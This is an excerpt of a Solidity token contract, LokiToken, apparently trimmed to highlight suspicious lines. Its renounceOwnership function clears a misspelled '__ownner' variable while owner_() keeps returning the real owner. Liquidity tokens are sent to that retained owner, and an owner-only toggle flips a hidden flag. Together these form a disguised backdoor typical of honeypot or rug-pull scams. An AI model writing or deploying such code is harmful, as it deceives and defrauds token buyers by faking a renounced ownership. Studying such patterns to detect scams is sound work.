...
contract Ownable is Context {
    ...
    function owner_() internal returns (address) {
        return _owner;
    }
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(__ownner, address(0));
        __ownner=address(0);
    }
...
contract LokiToken is Context, IERC20, Ownable {
    ...
    bool private is_b = false;
    bool private _is_b = is_b;
    ...
    function setMsendCheck() public view returns (bool) {
        return _is_b;
    }
    ...
    function addLiquidityETH() external onlyOwner() {
        ...
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner_(),block.timestamp);
        swapEnabled = true;
    ...
    function setMsend() external onlyOwner() {
        is_b = !is_b;
    }
}